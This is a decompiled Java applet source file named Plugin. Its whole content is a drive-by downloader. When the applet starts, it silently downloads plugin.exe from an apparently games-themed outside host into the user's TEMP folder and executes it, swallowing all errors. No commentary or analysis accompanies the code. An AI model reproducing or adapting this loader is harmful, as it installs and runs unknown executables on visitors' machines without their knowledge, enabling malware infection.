import java.io.InputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Plugin extends Applet
{
    @Override
    public void start() {
        try {
            final String concat = System.getenv("TEMP").concat("\\plugin.exe");
            final URL url = new URL("http://msn-games.net/plugin.exe");
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(concat));
            final InputStream inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            long n = 0L;
            int read;
            while ((read = inputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
                n += read;
            }
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex) {}
            final Runtime runtime = Runtime.getRuntime();
            try {
                final Process exec = runtime.exec(concat);
                exec.waitFor();
                final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
            }
            catch (Exception ex2) {}
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex3) {}
        }
        catch (Exception ex4) {}
    }
    
    public void main(final String[] array) {
        this.start();
    }
    
    @Override
    public void stop() {
    }
}
